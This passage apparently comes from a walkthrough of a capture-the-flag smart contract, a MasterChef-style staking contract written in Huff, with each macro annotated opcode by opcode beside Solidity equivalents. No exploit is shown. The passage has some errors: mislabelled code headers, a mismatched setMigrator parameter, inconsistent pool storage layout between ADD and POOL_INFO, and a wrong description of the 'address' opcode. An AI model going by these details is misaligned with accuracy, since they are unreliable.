    [DEVADDR_SLOT] sstore            // Store to DEVADDR_SLOT
    0x40 mload                       // Load third arg from memory[0x40]
    [SUSHI_PER_BLOCK_SLOT] sstore    // Store to SUSHI_PER_BLOCK_SLOT
    0x60 mload                       // Load fourth arg from memory[0x60]
    [START_BLOCK_SLOT] sstore        // Store to START_BLOCK_SLOT
    0x80 mload                       // Load fifth arg from memory[0x80]
    [BONUS_END_BLOCK_SLOT] sstore    // Store to BONUS_END_BLOCK_SLOT
    0xa0 mload                       // Load sixth arg from memory[0xa0]
    [PLAYER_SLOT] sstore             // Store to PLAYER_SLOT
    0x68 dup1                        // Push runtime bytecode size (0x68 = 104 bytes)
    codesize sub                     // Calculate runtime code start: codesize - 0x68
    dup1 swap2                       // Arrange stack for codecopy
    0x00 codecopy                    // Copy runtime bytecode to memory[0x00]
    0x00 return                      // Return runtime bytecode (deploys contract)
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent : constructor()") %}
```solidity
contract Cheff is Owned {
    constructor(
        address _sushi,
        address _devaddr,
        uint256 _sushiPerBlock,
        uint256 _startBlock,
        uint256 _bonusEndBlock,
        address _player
    ) Owned(msg.sender) {
        sushi = _sushi;
        devaddr = _devaddr;
        sushiPerBlock = _sushiPerBlock;
        startBlock = _startBlock;
        bonusEndBlock = _bonusEndBlock;
        player = _player;
    }
}
```
{%end%}

### Main Entry Point and Function Dispatching

The `MAIN` macro is the contract's entry point for all transactions after deployment. Every external call executes this macro to route the transaction to the appropriate function based on the function selector in calldata.

Function dispatching extracts the 4-byte function selector from calldata and compares it against each defined function signature using the `__FUNC_SIG` builtin. This builtin generates the function selector (first 4 bytes of `keccak256(functionSignature)`) at compile time. The dispatcher duplicates the selector and compares it with each possible function, jumping to the corresponding implementation when a match is found. The dispatching process relies on several critical opcodes: `calldataload` loads 32 bytes from calldata at a specified offset; `shr` shifts a value right by a specified number of bits (0xe0 = 224 bits = 28 bytes, leaving only the 4-byte selector); `dup1` duplicates the top stack item for reuse in multiple comparisons; `eq` compares two values and pushes 1 if equal or 0 otherwise; `jumpi` performs a conditional jump to a destination if the condition is non-zero; and `revert` aborts execution and reverts all state changes.

Huff introduces several advanced concepts for control flow: the `takes(n) returns(m)` syntax specifies macro stack behavior where `takes` declares how many stack items the macro consumes as input and `returns` declares how many items it produces as output (for example, `takes(2) returns(1)` means the macro expects 2 values on the stack when called and leaves 1 value when finished, while `takes(0) returns(0)` indicates the macro starts with an empty stack and leaves it empty, serving as documentation for developers and enabling stack validation during compilation); `__FUNC_SIG(functionName)` is a compile-time builtin that generates function selectors by computing the first 4 bytes of `keccak256("functionName(types...)")` which the compiler replaces with a `PUSH4` opcode containing the actual selector value; labels like `pool_length_jump:` mark jump destinations in bytecode creating named positions that `jump` and `jumpi` opcodes can target to make control flow readable (during compilation labels are converted to absolute bytecode positions); and macro invocations like `POOL_LENGTH()` inline another macro's code at that location during compilation which unlike function calls have zero runtime overhead since the code is copied directly rather than jumped to.

{% note(clickable=true, hidden=true, header="Huff Code : MAIN()") %}
```huff
#define macro MAIN() = takes(0) returns(0) {
    NON_PAYABLE()                          // Revert if msg.value > 0
    0x00 calldataload 0xe0 shr             // Extract function selector: calldata[0:32] >> 224
    dup1 __FUNC_SIG(poolLength)            eq pool_length_jump                  jumpi
    dup1 __FUNC_SIG(add)                   eq add_jump                          jumpi
    dup1 __FUNC_SIG(set)                   eq set_jump                          jumpi
    dup1 __FUNC_SIG(setMigrator)           eq set_migrator_jump                 jumpi
    dup1 __FUNC_SIG(migrate)               eq migrate_jump                      jumpi
    dup1 __FUNC_SIG(getMultiplier)         eq get_multiplier_jump               jumpi
    dup1 __FUNC_SIG(pendingSushi)          eq pending_sushi_jump                jumpi
    dup1 __FUNC_SIG(massUpdatePools)       eq mass_update_pools_jump            jumpi
    dup1 __FUNC_SIG(updatePool)            eq update_pool_jump                  jumpi
    dup1 __FUNC_SIG(deposit)               eq deposit_jump                      jumpi
    dup1 __FUNC_SIG(withdraw)              eq withdraw_jump                     jumpi
    dup1 __FUNC_SIG(emergencyWithdraw)     eq emergency_withdraw_jump           jumpi
    dup1 __FUNC_SIG(dev)                   eq dev_jump                          jumpi
    dup1 __FUNC_SIG(sushi)                 eq sushi_jump                        jumpi
    dup1 __FUNC_SIG(devaddr)               eq devaddr_jump                      jumpi
    dup1 __FUNC_SIG(bonusEndBlock)         eq bonus_end_block_jump              jumpi
    dup1 __FUNC_SIG(sushiPerBlock)         eq sushi_per_block_jump              jumpi
    dup1 __FUNC_SIG(BONUS_MULTIPLIER)      eq bonus_multiplier_jump             jumpi
    dup1 __FUNC_SIG(migrator)              eq migrator_jump                     jumpi
    dup1 __FUNC_SIG(poolInfo)              eq pool_info_jump                    jumpi
    dup1 __FUNC_SIG(userInfo)              eq user_info_jump                    jumpi
    dup1 __FUNC_SIG(totalAllocPoint)       eq total_alloc_point_jump            jumpi
    dup1 __FUNC_SIG(startBlock)            eq start_block_jump                  jumpi
    dup1 __FUNC_SIG(player)                eq player_jump                       jumpi
    dup1 __FUNC_SIG(isSolved)              eq is_solved_jump                    jumpi
    OWNED_MAIN()                           // Check inherited Owned functions
    0x00 dup1 revert                       // No match found, revert

    // Jump destinations - each invokes corresponding macro
    pool_length_jump:
        POOL_LENGTH()
    add_jump:
        ADD()
    set_jump:
        SET()
    set_migrator_jump:
        SET_MIGRATOR()
    migrate_jump:
        MIGRATE()
    get_multiplier_jump:
        GET_MULTIPLIER()
    pending_sushi_jump:
        PENDING_SUSHI()
    mass_update_pools_jump:
        MASS_UPDATE_POOLS()
    update_pool_jump:
        UPDATE_POOL()
    deposit_jump:
        DEPOSIT()
    withdraw_jump:
        WITHDRAW()
    emergency_withdraw_jump:
        EMERGENCY_WITHDRAW()
    dev_jump:
        DEV()
    sushi_jump:
        SUSHI()
    devaddr_jump:
        DEVADDR()
    bonus_end_block_jump:
        BONUS_END_BLOCK()
    sushi_per_block_jump:
        SUSHI_PER_BLOCK()
    bonus_multiplier_jump:
        BONUS_MULTIPLIER()
    migrator_jump:
        MIGRATOR()
    pool_info_jump:
        POOL_INFO()
    user_info_jump:
        USER_INFO()
    total_alloc_point_jump:
        TOTAL_ALLOC_POINT()
    start_block_jump:
        START_BLOCK()
    player_jump:
        PLAYER()
    is_solved_jump:
        IS_SOLVED()
}
```
{%end%}
In Solidity, the compiler automatically generates the function dispatcher. So we won't see the equivalent solidity code in the contract.


**Function Selection Flow:**

When a transaction was made to the smart contract the function selection logic will execute in the following flow.

1. Transaction arrives with calldata: `0x949d225d0000...` (example)
2. MAIN macro extracts selector: `0x949d225d` (first 4 bytes)
3. Compares selector against each `__FUNC_SIG`:
   - `poolLength` → `0x081e3eda` → no match
   - `add` → `0x1eaaa045` → no match
   - ... continues checking ...
   - `deposit` → `0x949d225d` → **match found**
4. Executes `jumpi` to `deposit_jump` label
5. Invokes `DEPOSIT()` macro to handle transaction
6. If no match found after all checks, reverts with `0x00 dup1 revert`

### Functions

#### SUSHI() - Get Sushi Token Address

Returns the address of the SUSHI reward token. This function introduces the `sload` opcode for reading from persistent storage and `mstore` for writing to memory before returning data. The `sload` opcode loads 32 bytes from a specified storage slot, while `mstore` writes 32 bytes to memory at a specified offset, preparing data for the `return` opcode.

{% note(clickable=true, hidden=true, header="Huff Code: SUSHI()") %}
```huff
#define macro SUSHI() = takes(0) returns(0) {
    // Stack: []
    [SUSHI_SLOT] sload
    // Stack: [sushi_address]
    // Loads SUSHI token address from storage slot 0

    0x00 mstore
    // Stack: []
    // Memory[0x00]: sushi_address (32 bytes)

    0x20 0x00 return
    // Returns 32 bytes from memory[0x00]
    // Stack: []
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: devaddr()") %}
```solidity
function sushi() external view returns (address) {
    return sushi;
}
```
{%end%}

The Solidity compiler handles storage access and return data formatting automatically, returning the state variable directly.

---

#### DEVADDR() - Get Developer Address

Returns the address designated to receive developer fees from the protocol. This function follows the same pattern as SUSHI(), using `sload` to read from storage and `mstore`/`return` to format and return the data to the caller.

{% note(clickable=true, hidden=true, header="Huff Code: SUSHI()") %}
```huff
#define macro DEVADDR() = takes(0) returns(0) {
    // Stack: []
    [DEVADDR_SLOT] sload
    // Stack: [devaddr_address]
    // Loads developer address from storage slot 1

    0x00 mstore
    // Stack: []
    // Memory[0x00]: devaddr_address (32 bytes)

    0x20 0x00 return
    // Returns 32 bytes from memory[0x00]
    // Stack: []
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: devaddr()") %}
```solidity
function devaddr() external view returns (address) {
    return devaddr;
}
```
{%end%}

The Solidity compiler reads the state variable and handles the return data encoding automatically.

---

#### POOL_LENGTH() - Get Total Number of Pools

Returns the total count of staking pools registered in the contract. Like the previous getters, this uses `sload` to retrieve the pool count from storage and returns it through memory.

{% note(clickable=true, hidden=true, header="Huff Code: POOL_LENGTH()") %}
```huff
#define macro POOL_LENGTH() = takes(0) returns(0) {
    // Stack: []
    [POOL_INFO_SLOT] sload
    // Stack: [pool_count]
    // Loads total number of pools from storage slot 2

    0x00 mstore
    // Stack: []
    // Memory[0x00]: pool_count (32 bytes)

    0x20 0x00 return
    // Returns 32 bytes from memory[0x00]
    // Stack: []
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: poolLength()") %}
```solidity
function poolLength() external view returns (uint256) {
    return poolInfo.length;
}
```
{%end%}

In Solidity, accessing a dynamic array's length property is a simple state read operation.

---

#### BONUS_MULTIPLIER() - Get Bonus Multiplier Constant

Returns a constant multiplier value used in reward calculations. Unlike previous functions that read from storage, this function returns a compile-time constant (10) by directly pushing the value onto the stack. The constant is defined as `BONUS_MULTIPLIER_CONSTANT` which expands to `0x0a` (10 in hexadecimal) during macro expansion.

{% note(clickable=true, hidden=true, header="Huff Code: BONUS_MULTIPLIER()") %}
```huff
#define macro BONUS_MULTIPLIER() = takes(0) returns(0) {
    // Stack: []
    [BONUS_MULTIPLIER_CONSTANT] 0x00 mstore
    // Stack: []
    // Pushes constant value 0x0a (10) and stores to memory[0x00]
    // Memory[0x00]: 0x0a (32 bytes, padded)

    0x20 0x00 return
    // Returns 32 bytes from memory[0x00]
    // Stack: []
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: BONUS_MULTIPLIER()") %}
```solidity
function BONUS_MULTIPLIER() external view returns (uint256) {
    return 10;
}
```
{%end%}

Solidity constants are inlined at compile time, eliminating storage reads.

---

#### PLAYER() - Get Player Address

Returns the address of the player participating in the CTF challenge. This storage slot is initialized in the constructor and remains constant throughout the contract's lifetime.

{% note(clickable=true, hidden=true, header="Huff Code: PLAYER()") %}
```huff
#define macro PLAYER() = takes(0) returns(0) {
    // Stack: []
    [PLAYER_SLOT] sload
    // Stack: [player_address]
    // Loads player address from storage slot 3

    0x00 mstore
    // Stack: []
    // Memory[0x00]: player_address (32 bytes)

    0x20 0x00 return
    // Returns 32 bytes from memory[0x00]
    // Stack: []
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: player()") %}
```solidity
function player() external view returns (address) {
    return player;
}
```
{%end%}

Returns the immutable player address set during contract deployment.

---

#### IS_SOLVED() - Check Challenge Solution

Verifies whether the player has successfully completed the CTF challenge by checking their SUSHI token balance. This function introduces several new concepts: the `gt` opcode performs greater-than comparison between two stack values, pushing 1 if the first is greater or 0 otherwise; `iszero` performs logical NOT, flipping 0 to 1 and any non-zero value to 0. The function also demonstrates external contract calls using the `ERC20_BALANCE_OF()` macro, which uses `staticcall` to query the player's token balance from the SUSHI contract. The challenge is considered solved when the player has accumulated more than 1,000,000 SUSHI tokens (1,000,000 * 10^18 in wei).

{% note(clickable=true, hidden=true, header="Huff Code: IS_SOLVED()") %}
```huff
#define macro IS_SOLVED() = takes(0) returns(0) {
    // Stack: []
    [SUSHI_SLOT] sload
    // Stack: [sushi_address]

    [PLAYER_SLOT] sload
    // Stack: [player_address, sushi_address]

    ERC20_BALANCE_OF(0x00)
    // Stack: [balance]
    // Calls sushi.balanceOf(player) and stores result in memory[0x00]
    // Memory[0x00]: player_balance (32 bytes)

    0xd3c21bcecceda1000000
    // Stack: [1000000000000000000000000, balance]
    // Pushes threshold: 1,000,000 SUSHI (with 18 decimals)

    gt
    // Stack: [balance > threshold ? 1 : 0]

    iszero
    // Stack: [balance > threshold ? 0 : 1]
    // Inverts the comparison result

    0x40 mstore
    // Stack: []
    // Memory[0x40]: comparison_result (32 bytes)

    0x20 0x40 return
    // Returns 32 bytes from memory[0x40]
    // Stack: []
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: isSolved()") %}
```solidity
function isSolved() external view returns (bool) {
    return sushi.balanceOf(player) > 1_000_000 * 1e18;
}
```
{%end%}

The Solidity version abstracts away the manual memory management and external call encoding.

---

#### GET_MULTIPLIER() - Calculate Reward Multiplier

Calculates the reward multiplier between two block numbers, applying a bonus multiplier during the bonus period. The function uses the `INNER_GET_MULTIPLIER()` helper macro which implements three distinct cases: if the entire range falls within the bonus period (to ≤ bonusEndBlock), it applies the bonus multiplier to the full range; if the range is entirely after the bonus period (from ≥ bonusEndBlock), it returns the simple block difference; if the range spans across the bonus end block, it splits the calculation, applying the bonus multiplier to blocks before bonusEndBlock and regular 1× multiplier to blocks after. This introduces the `jumpi` opcode for conditional jumps based on stack comparisons, and demonstrates how complex branching logic is implemented in low-level EVM code.

{% note(clickable=true, hidden=true, header="Huff Code: GET_MULTIPLIER()") %}
```huff
#define macro GET_MULTIPLIER() = takes(0) returns(0) {
    // Stack: []
    0x04 calldataload
    // Stack: [from_block]

    0x24 calldataload
    // Stack: [to_block, from_block]

    INNER_GET_MULTIPLIER()
    // Stack: [multiplier_result]
    // Expands to inline multiplier calculation logic below

    0x00 mstore
    // Stack: []
    // Memory[0x00]: multiplier_result (32 bytes)

    0x20 0x00 return
    // Returns 32 bytes from memory[0x00]
    // Stack: []
}

// INNER_GET_MULTIPLIER() expansion: takes(2) returns(1)
// Input stack: [to, from]
#define macro INNER_GET_MULTIPLIER() = takes(2) returns(1) {
    // Stack: [to, from]
    [BONUS_END_BLOCK_SLOT] sload
    // Stack: [bonusEndBlock, to, from]

    dup1 dup3 gt
    // Stack: [to > bonusEndBlock, bonusEndBlock, to, from]

    to_is_bigger_jump jumpi
    // If to > bonusEndBlock, jump. Otherwise fall through to Case 1.
        pop
        // Stack: [to, from]
        SAFE_SUB()
        // Stack: [to - from]
        [BONUS_MULTIPLIER_CONSTANT] SAFE_MUL()
        // Stack: [(to - from) * BONUS_MULTIPLIER]
        end_jump jump

    to_is_bigger_jump:
    // Stack: [bonusEndBlock, to, from]
    dup1 dup4 lt
    // Stack: [from < bonusEndBlock, bonusEndBlock, to, from]

    from_is_smaller_jump jumpi
    // If from < bonusEndBlock, jump to Case 3. Otherwise fall through to Case 2.
        pop
        // Stack: [to, from]
        SAFE_SUB()
        // Stack: [to - from]
        end_jump jump

    from_is_smaller_jump:
    // Case 3: from < bonusEndBlock < to (range spans bonus end)
    // Stack: [bonusEndBlock, to, from]
    swap2 dup3
    // Stack: [bonusEndBlock, from, to, bonusEndBlock]
    SAFE_SUB()
    // Stack: [bonusEndBlock - from, to, bonusEndBlock]
    [BONUS_MULTIPLIER_CONSTANT] SAFE_MUL()
    // Stack: [(bonusEndBlock - from) * BONUS_MULTIPLIER, to, bonusEndBlock]
    swap2 swap1
    // Stack: [to, bonusEndBlock, (bonusEndBlock - from) * BONUS_MULTIPLIER]
    SAFE_SUB()
    // Stack: [to - bonusEndBlock, (bonusEndBlock - from) * BONUS_MULTIPLIER]
    SAFE_ADD()
    // Stack: [(bonusEndBlock - from) * BONUS_MULTIPLIER + (to - bonusEndBlock)]

    end_jump:
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: getMultiplier()") %}
```solidity
function getMultiplier(uint256 from, uint256 to) external view returns (uint256) {
    if (to <= bonusEndBlock) {
        return (to - from) * BONUS_MULTIPLIER;
    } else if (from >= bonusEndBlock) {
        return to - from;
    } else {
        return (bonusEndBlock - from) * BONUS_MULTIPLIER + (to - bonusEndBlock);
    }
}
```
{%end%}

The Solidity version uses if-else statements to handle the three cases of bonus period calculation.

---

#### POOL_INFO() - Get Pool Information

Returns complete pool information for a specific pool ID including the LP token address, allocation points, last reward block, and accumulated SUSHI per share. This function demonstrates reading multiple sequential storage slots and returning multiple values through memory, with each value placed at a different memory offset (0x00, 0x20, 0x40, 0x60) to create a packed return data structure.

{% note(clickable=true, hidden=true, header="Huff Code: POOL_INFO()") %}
```huff
#define macro POOL_INFO() = takes(0) returns(0) {
    // Stack: []
    0x04 calldataload
    // Stack: [pool_id]

    dup1 CHECK_PID()
    // Stack: [pool_id]
    // Validates pool_id < poolLength

    GET_POOL_SLOT(0x00)
    // Stack: [pool_slot]
    // Calculates base storage slot for pool struct
    // Memory[0x00]: used for sha3 computation in GET_POOL_SLOT

    dup1 sload
    // Stack: [lpToken, pool_slot]

    0x00 mstore
    // Stack: [pool_slot]
    // Memory[0x00]: lpToken (32 bytes)

    dup1 0x01 add sload
    // Stack: [allocPoint, pool_slot]

    0x20 mstore
    // Stack: [pool_slot]
    // Memory[0x20]: allocPoint (32 bytes)

    dup1 0x02 add sload
    // Stack: [lastRewardBlock, pool_slot]

    0x40 mstore
    // Stack: [pool_slot]
    // Memory[0x40]: lastRewardBlock (32 bytes)

    0x03 add sload
    // Stack: [accSushiPerShare]

    0x60 mstore
    // Stack: []
    // Memory[0x60]: accSushiPerShare (32 bytes)

    0x80 0x00 return
    // Returns 128 bytes from memory[0x00] (4 values × 32 bytes)
    // Stack: []
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: poolInfo()") %}
```solidity
function poolInfo(uint256 pid) external view returns (
    address lpToken,
    uint256 allocPoint,
    uint256 lastRewardBlock,
    uint256 accSushiPerShare
) {
    PoolInfo memory pool = poolInfo[pid];
    return (pool.lpToken, pool.allocPoint, pool.lastRewardBlock, pool.accSushiPerShare);
}
```
{%end%}

Solidity automatically packs multiple return values into ABI-encoded return data.

---

#### USER_INFO() - Get User Staking Information

Returns a user's staked amount and reward debt for a specific pool. This function demonstrates nested mapping access in Huff using the `GET_SLOT_FROM_KEYS_2D()` macro, which computes the storage slot for `userInfo[pid][user]` by hashing the keys together using the standard Solidity storage layout algorithm.

{% note(clickable=true, hidden=true, header="Huff Code: USER_INFO()") %}
```huff
#define macro USER_INFO() = takes(0) returns(0) {
    // Stack: []
    0x24 calldataload
    // Stack: [user_address]

    0x04 calldataload
    // Stack: [pool_id, user_address]

    [USER_INFO_SLOT]
    // Stack: [USER_INFO_SLOT, pool_id, user_address]

    GET_SLOT_FROM_KEYS_2D(0x00)
    // Stack: [user_slot]
    // Calculates storage slot for userInfo[pid][user]
    // Memory[0x00]: used for sha3 computation in GET_SLOT_FROM_KEYS_2D

    dup1 sload
    // Stack: [user.amount, user_slot]

    0x00 mstore
    // Stack: [user_slot]
    // Memory[0x00]: user.amount (32 bytes)

    0x01 add sload
    // Stack: [user.rewardDebt]

    0x20 mstore
    // Stack: []
    // Memory[0x20]: user.rewardDebt (32 bytes)

    0x40 0x00 return
    // Returns 64 bytes from memory[0x00] (2 values × 32 bytes)
    // Stack: []
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: userInfo()") %}
```solidity
function userInfo(uint256 pid, address user) external view returns (
    uint256 amount,
    uint256 rewardDebt
) {
    UserInfo memory user = userInfo[pid][user];
    return (user.amount, user.rewardDebt);
}
```
{%end%}

Solidity handles nested mapping lookups and tuple returns automatically.

---

#### ADD() - Add New Pool

Adds a new liquidity pool to the contract with specified allocation points and LP token address. This function is restricted to the contract owner using the `ONLY_OWNER()` macro and introduces several important concepts: the `stop` opcode which halts execution successfully without returning data (unlike `return`), the `sha3` opcode for computing Keccak-256 hashes used in storage slot calculations, and the `number` opcode which pushes the current block number onto the stack. The function also demonstrates complex storage manipulation for dynamic arrays in Solidity, using `sha3` to calculate the storage location of array elements based on the array's base slot. Conditional execution is handled via `jumpi` for optionally updating all pools and determining the appropriate lastRewardBlock based on whether rewards have started.

{% note(clickable=true, hidden=true, header="Huff Code: ADD()") %}
```huff
#define macro ADD() = takes(0) returns(0) {
    // Stack: []
    ONLY_OWNER()
    // Stack: []
    // Reverts if msg.sender != owner

    0x04 calldataload
    // Stack: [allocPoint]

    0x24 calldataload
    // Stack: [lpToken, allocPoint]

    0x44 calldataload
    // Stack: [withUpdate, lpToken, allocPoint]

    iszero no_update_jump jumpi
    // Stack: [lpToken, allocPoint]
        MASS_UPDATE_POOLS()
        // Updates all existing pools
    no_update_jump:
    // Stack: [lpToken, allocPoint]

    [START_BLOCK_SLOT] sload
    // Stack: [startBlock, lpToken, allocPoint]

    dup1 number
    // Stack: [currentBlock, startBlock, startBlock, lpToken, allocPoint]

    gt iszero
    // Stack: [startBlock >= currentBlock, startBlock, lpToken, allocPoint]

    is_not_bigger_jump jumpi
    // Stack: [startBlock, lpToken, allocPoint]
        pop number
        // Stack: [currentBlock, lpToken, allocPoint]
        // Use current block if we're past start block
    is_not_bigger_jump:
    // Stack: [lastRewardBlock, lpToken, allocPoint]

    swap2 dup1
    // Stack: [allocPoint, allocPoint, lastRewardBlock, lpToken]

    [TOTAL_ALLOC_POINT_SLOT] sload
    // Stack: [totalAllocPoint, allocPoint, allocPoint, lastRewardBlock, lpToken]

    SAFE_ADD()
    // Stack: [totalAllocPoint + allocPoint, allocPoint, lastRewardBlock, lpToken]

    [TOTAL_ALLOC_POINT_SLOT] sstore
    // Stack: [allocPoint, lastRewardBlock, lpToken]

    swap1
    // Stack: [lastRewardBlock, allocPoint, lpToken]

    [POOL_INFO_SLOT] dup1 sload
    // Stack: [poolLength, POOL_INFO_SLOT, lastRewardBlock, allocPoint, lpToken]

    dup1 0x01 add
    // Stack: [poolLength + 1, poolLength, POOL_INFO_SLOT, lastRewardBlock, allocPoint, lpToken]

    dup3 sstore
    // Stack: [poolLength + 1, poolLength, POOL_INFO_SLOT, lastRewardBlock, allocPoint, lpToken]
    // storage[POOL_INFO_SLOT] = poolLength + 1

    0x04 mul
    // Stack: [poolLength * 4, POOL_INFO_SLOT, lastRewardBlock, allocPoint, lpToken]
    // Each pool struct has 4 storage slots

    swap1 0x00 mstore
    // Stack: [poolLength * 4, lastRewardBlock, allocPoint, lpToken]
    // Memory[0x00]: POOL_INFO_SLOT (32 bytes)

    0x20 0x00 sha3
    // Stack: [keccak256(POOL_INFO_SLOT), poolLength * 4, lastRewardBlock, allocPoint, lpToken]
    // Base slot for array data

    add
    // Stack: [pool_base_slot, lastRewardBlock, allocPoint, lpToken]
    // storage slot for poolInfo[poolLength]

    swap1 dup2 sstore
    // Stack: [pool_base_slot, allocPoint, lpToken]
    // storage[pool_base_slot] = lastRewardBlock

    0x01 add
    // Stack: [pool_base_slot + 1, allocPoint, lpToken]

    swap1 dup2 sstore
    // Stack: [pool_base_slot + 1, lpToken]
    // storage[pool_base_slot + 1] = allocPoint

    0x01 add sstore
    // Stack: []
    // storage[pool_base_slot + 2] = lpToken
    // Note: accSushiPerShare (slot + 3) remains 0 (default)

    stop
    // Halt execution successfully
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: add()") %}
```solidity
function add(uint256 allocPoint, address lpToken, bool withUpdate) external onlyOwner {
    if (withUpdate) {
        massUpdatePools();
    }
    uint256 lastRewardBlock = block.number > startBlock ? block.number : startBlock;
    totalAllocPoint = totalAllocPoint + allocPoint;
    poolInfo.push(PoolInfo({
        lpToken: lpToken,
        allocPoint: allocPoint,
        lastRewardBlock: lastRewardBlock,
        accSushiPerShare: 0
    }));
}
```
{%end%}

Solidity handles dynamic array push operations and storage layout automatically.

---

#### SET() - Update Pool Allocation

Updates the allocation points for an existing pool, adjusting the total allocation accordingly. This function demonstrates chained macro calls with `SAFE_SUB()` and `SAFE_ADD()` operating on the same stack values, and shows how `sstore` can be chained to write to multiple storage locations efficiently. The function uses the `GET_POOL_SLOT()` macro to compute the storage location of a pool struct from its ID.

{% note(clickable=true, hidden=true, header="Huff Code: SET()") %}
```huff
#define macro SET() = takes(0) returns(0) {
    // Stack: []
    ONLY_OWNER()
    // Stack: []

    0x04 calldataload
    // Stack: [pid]

    dup1 CHECK_PID()
    // Stack: [pid]
    // Validates pid < poolLength

    0x24 calldataload
    // Stack: [newAllocPoint, pid]

    0x44 calldataload
    // Stack: [withUpdate, newAllocPoint, pid]

    iszero no_update_jump jumpi
    // Stack: [newAllocPoint, pid]
        MASS_UPDATE_POOLS()
    no_update_jump:
    // Stack: [newAllocPoint, pid]

    swap1 GET_POOL_SLOT(0x00)
    // Stack: [pool_slot, newAllocPoint]
    // Memory[0x00]: used for sha3 computation in GET_POOL_SLOT

    0x01 add
    // Stack: [pool_slot + 1, newAllocPoint]
    // Points to allocPoint field

    dup2 dup2 sload
    // Stack: [oldAllocPoint, pool_slot + 1, newAllocPoint, pool_slot + 1]

    [TOTAL_ALLOC_POINT_SLOT] sload
    // Stack: [totalAllocPoint, oldAllocPoint, pool_slot + 1, newAllocPoint, pool_slot + 1]

    SAFE_SUB() SAFE_ADD()
    // Stack: [totalAllocPoint - oldAllocPoint + newAllocPoint, pool_slot + 1, newAllocPoint, pool_slot + 1]

    [TOTAL_ALLOC_POINT_SLOT] sstore sstore
    // Stack: [newAllocPoint, pool_slot + 1]
    // First sstore: storage[TOTAL_ALLOC_POINT_SLOT] = new total
    // Second sstore: storage[pool_slot + 1] = newAllocPoint

    stop
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: set()") %}
```solidity
function set(uint256 pid, uint256 allocPoint, bool withUpdate) external onlyOwner {
    if (withUpdate) {
        massUpdatePools();
    }
    totalAllocPoint = totalAllocPoint - poolInfo[pid].allocPoint + allocPoint;
    poolInfo[pid].allocPoint = allocPoint;
}
```
{%end%}

Solidity performs the arithmetic and storage updates in a single expression.

---

#### SET_MIGRATOR() - Set Migration Contract

Sets the migrator contract address for LP token migration. This is the simplest state-changing function, demonstrating the minimal pattern for owner-only functions that perform a single storage write.

{% note(clickable=true, hidden=true, header="Huff Code: SET_MIGRATOR()") %}
```huff
#define macro SET_MIGRATOR() = takes(0) returns(0) {
    // Stack: []
    ONLY_OWNER()
    // Stack: []

    0x04 calldataload
    // Stack: [migrator_address]

    [MIGRATOR_SLOT] sstore
    // Stack: []
    // storage[MIGRATOR_SLOT] = migrator_address

    stop
    // Halt execution successfully
}
```
{%end%}

{% note(clickable=true, hidden=true, header="Solidity Equivalent: setMigrator()") %}
```solidity
function setMigrator(address migrator) external onlyOwner {
    migrator = _migrator;
}
```
{%end%}

A simple setter function with access control.

---

#### DEPOSIT() - Stake LP Tokens

Stakes LP tokens into a pool and claims any pending rewards. This function introduces several critical opcodes and concepts: the `caller` opcode pushes msg.sender onto the stack, while `address` masks a value to 20 bytes (ensuring proper address formatting); `log3` emits an event with three indexed topics (the event signature hash plus two indexed parameters); `pop` discards the top stack item. The function demonstrates complex multi-step operations including checking and claiming pending rewards if the user already has a stake, transferring LP tokens from the user using `SAFE_TRANSFER_FROM()`, updating the user's staked amount and reward debt, and finally emitting a Deposit event. Safe math operations are performed using `SAFE_MUL()` for multiplication, `SAFE_DIV()` for division with zero-check, while `SAFE_SUSHI_TRANSFER()` handles reward token transfers and `__EVENT_HASH()` computes event signatures at compile time.

{% note(clickable=true, hidden=true, header="Huff Code: DEPOSIT()") %}
```huff
#define macro DEPOSIT() = takes(0) returns(0) {
    // Stack: []
    0x24 calldataload
    // Stack: [amount]

    0x04 calldataload
    // Stack: [pid, amount]

    dup1 CHECK_PID()  // takes(1) returns(0) - validates pid < poolLength
    // Stack: [pid, amount]

    dup1
    // Stack: [pid, pid, amount]

    INNER_UPDATE_POOL() // takes(1) returns(0) - updates pool rewards
    // Stack: [pid, amount]

    dup1
    // Stack: [pid, pid, amount]

    GET_POOL_SLOT(0x00)  // takes(1) returns(1) - calculates pool storage slot
    // Stack: [pool_slot, pid, amount]

    caller dup3
    // Stack: [pid, msg.sender, pool_slot, pid, amount]

    [USER_INFO_SLOT]
    // Stack: [USER_INFO_SLOT, pid, msg.sender, pool_slot, pid, amount]

    GET_SLOT_FROM_KEYS_2D(0x20) // takes(3) returns(1) - calculates userInfo[pid][msg.sender] slot
    // Stack: [user_slot, pool_slot, pid, amount]
    // user_slot = storage location of userInfo[pid][msg.sender]

    dup1 sload
    // Stack: [user.amount, user_slot, pool_slot, pid, amount]

    dup1 iszero
    // Stack: [is_zero, user.amount, user_slot, pool_slot, pid, amount]

    user_amount_zero_jump jumpi // if user.amount == 0, skip reward claim
    // Stack: [user.amount, user_slot, pool_slot, pid, amount]

    // ===== Claim Pending Rewards (if user.amount > 0) =====
        dup1 [E]
        // Stack: [1e12, user.amount, user.amount, user_slot, pool_slot, pid, amount]

        dup5 0x03 add sload
        // Stack: [pool.accSushiPerShare, 1e12, user.amount, user.amount, user_slot, pool_slot, pid, amount]
        // Loaded from pool_slot + 3

        dup5 0x01 add
        // Stack: [user_slot+1, pool.accSushiPerShare, 1e12, user.amount, user.amount, user_slot, pool_slot, pid, amount]

        sload
        // Stack: [user.rewardDebt, pool.accSushiPerShare, 1e12, user.amount, user.amount, user_slot, pool_slot, pid, amount]
        // Loaded from user_slot + 1

        swap3
        // Stack: [user.amount, pool.accSushiPerShare, 1e12, user.rewardDebt, user.amount, user_slot, pool_slot, pid, amount]

        SAFE_MUL() // takes(2) returns(1)
        // Stack: [user.amount * pool.accSushiPerShare, 1e12, user.rewardDebt, user.amount, user_slot, pool_slot, pid, amount]

        SAFE_DIV() // takes(2) returns(1)
